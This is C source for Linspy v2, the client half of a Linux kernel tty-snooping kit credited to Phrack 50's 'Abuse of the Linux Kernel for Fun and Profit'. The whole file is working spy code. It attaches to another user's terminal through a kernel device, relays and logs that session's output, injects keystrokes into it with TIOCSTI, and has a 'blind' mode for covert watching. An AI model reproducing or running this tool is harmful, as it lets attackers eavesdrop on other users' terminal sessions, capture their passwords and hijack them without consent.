/*
Linspy v2beta1
-Drago (Drago@Drago.com)
Linspy v2beta2
-xian (xian@pgp.pl) 
no modifications here...
Orignally:
           .oO Phrack 50 Oo.
          Volume Seven, Issue Fifty
                  5 of 16
 ============================================
 Abuse of the Linux Kernel for Fun and Profit
          halflife@infonexus.com
           [guild  corporation]
 ============================================
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <asm/ioctls.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

struct termios save_termios;
int ttysavefd = -1;
int fd;
int my_tty;

FILE *lf=NULL;

#ifndef DEVICE_NAME
# define DEVICE_NAME "/dev/ltap2"
#endif

#define LS_SETMAJOR     0
#define LS_SETMINOR     1

#define LS_FLUSHBUF     2
#define LS_TOGGLE       3

void stuff_keystroke(int fd, char key)
{
   ioctl(fd, TIOCSTI, &key);
}

int tty_cbreak(int fd)
{
   struct termios buff;
   if(tcgetattr(fd, &save_termios) < 0)
     return -1;
   buff = save_termios;
   buff.c_lflag &= ~(ECHO | ICANON);
   buff.c_cc[VMIN] = 0;
   buff.c_cc[VTIME] = 0;
   if(tcsetattr(fd, TCSAFLUSH, &buff) < 0)
     return -1;
   ttysavefd = fd;
   return 0;
}

char *get_device(char *basedevice)
{
   static char devname[1024];
   int fd;
   
   if(strlen(basedevice) > 128) return NULL;
   if(basedevice[0] == '/')
     strcpy(devname, basedevice);
   else
     sprintf(devname, "/dev/%s", basedevice);
   fd = open(devname, O_RDONLY);
   if(fd < 0) return NULL;
   if(!isatty(fd)) return NULL;
   close(fd);
   return devname;
}


int do_ioctl(char *device)
{
   struct stat mystat;
   
   if(stat(device, &mystat) < 0) return -1;
   fd = open(DEVICE_NAME, O_RDONLY);
   if(fd < 0) return -1;
   if(ioctl(fd, LS_SETMAJOR, major(mystat.st_rdev)) < 0) return -1;
   if(ioctl(fd, LS_SETMINOR, minor(mystat.st_rdev)) < 0) return -1;
}


void sig_handler(int s)
{
   switch (s) {
    case SIGINT:
      stuff_keystroke(my_tty,'\003');
      break;
    case SIGTSTP:
      stuff_keystroke(my_tty,'\032');
      break;
   }		
}

void cleanup_atexit(void)
{
   if (lf) fclose(lf);
   puts(" ");
   if(ttysavefd >= 0)
     tcsetattr(ttysavefd, TCSAFLUSH, &save_termios);
}

main(int argc, char **argv)
{
   fd_set rfds, u_rfds;
   struct timeval tv, utv;
   char *devname;
   unsigned char ch;
   int i;
   int s;
   int escape=0, blind=0;
   int readonly=0;
   char lfile[100];
   signal(SIGINT, sig_handler);
   signal(SIGTSTP, sig_handler);
   if(argc != 2)
     {
	fprintf(stderr, "%s ttyname\n", argv[0]);
	fprintf(stderr, "ttyname should NOT be your current tty!\n");
	exit(0);
     }
   devname = get_device(argv[1]);
   if(devname == NULL)
     {
	perror("get_device");
	exit(0);
     }
   if(tty_cbreak(0) < 0)
     {
	perror("tty_cbreak");
	exit(0);
     }
   atexit(cleanup_atexit);
   if(do_ioctl(devname) < 0)
     {
	perror("do_ioctl");
	exit(0);
     }
   my_tty = open(devname, O_RDWR);
   if(my_tty == -1) exit(0);
   setvbuf(stdout, NULL, _IONBF, 0);
   printf("Monitoring %s....^AH for help\n", argv[1]);
   FD_SET(0, &rfds);
   FD_SET(fd, &rfds);
   tv.tv_sec = 5;
   tv.tv_usec = 0;
   snprintf(lfile, sizeof(lfile), "linspy2.log.%s", argv[1]);
   
   while(1)
     {
	char buff[1024];
	u_rfds=rfds;
	utv=tv;
	s=select(fd+1,  &u_rfds,  NULL, NULL, &utv);
	if (FD_ISSET(0, &u_rfds)) {
	   i = read(0, &ch, 1);
	   if(i > 0) {
	      if (ch==1 && escape==0) {
		 escape=1;
	      }
	      else {
		 if (escape==1) {
		    switch (toupper(ch)) {
		     case 'Q':
		       printf("\n%s: exit...\n", argv[1]);
		       exit(0);
		       break;
		     case 'A':
		       escape=2;
		       break;
		     case 'L':
		       if (lf) {
			  fclose(lf);
			  lf=NULL;
			  printf("\n%s: Logging off (%s)\n", argv[1], lfile);
		       }
		       else {
			  lf=fopen(lfile, "a+");
			  printf("\n%s: Logging on (%s)\n", argv[1], lfile);
		       }
		       break;
		     case 'B':
		       if (blind) {
			  blind=0;
			  printf("\n%s: Blind off\n", argv[1]);
		       }
		       else {
			  blind=1;
			  printf("\n%s: Blind on\n", argv[1]);
		       }
		       ioctl(fd, LS_TOGGLE, 0);
		       break;
		     case 'R':
		       if (readonly) {
			  readonly=0;
			  printf("\n%s: Readonly off\n", argv[1]);
		       }
		       else {
			  readonly=1;
			  printf("\n%s: Readonly on\n", argv[1]);
		       }
		       break;
		     case 'U':
		       printf(
			      "\nLinspy v2beta1\n"
			      "-Drago (Drago@Drago.com)\n"
			      "\nOrignally:\n"
			      "           .oO Phrack 50 Oo.\n"
			      "          Volume Seven, Issue Fifty\n"
			      "                  5 of 16\n"
			      " ============================================\n"
			      " Abuse of the Linux Kernel for Fun and Profit\n"
			      "          halflife@infonexus.com\n"
			      "           [guild  corporation]\n"
			      " ============================================\n"
			      );
		       break;
		     case 'H':
		       printf("\nltread2 commands\n");
		       printf("L: toggle logging\n");
		       printf("B: toggle blind\n");
		       printf("A: escape ^A\n");
		       printf("R: toggle readonly\n");
		       printf("U: about\n");
		       printf("Q: quit\n");
		       printf("H: this\n");
		       break;
		     default:
		       printf("\n%s: Huh? ^AH for help\n", argv[1]);
		       break;
		    }
		    if (escape!=2) escape=0;
		 }
		 else if (!readonly) {
		    stuff_keystroke(my_tty,ch);
		    escape=0;
		 }
	      }
	   }
	}
	if (FD_ISSET(fd, &u_rfds)) {
	   i = read(fd, buff, sizeof(buff));
	   if(i > 0)
	     write(1, buff, i);
	   if (lf) fwrite(buff, sizeof(char), i, lf);
	   fflush(stdout);
	}
	usleep(1);
     }
   return 0;
}

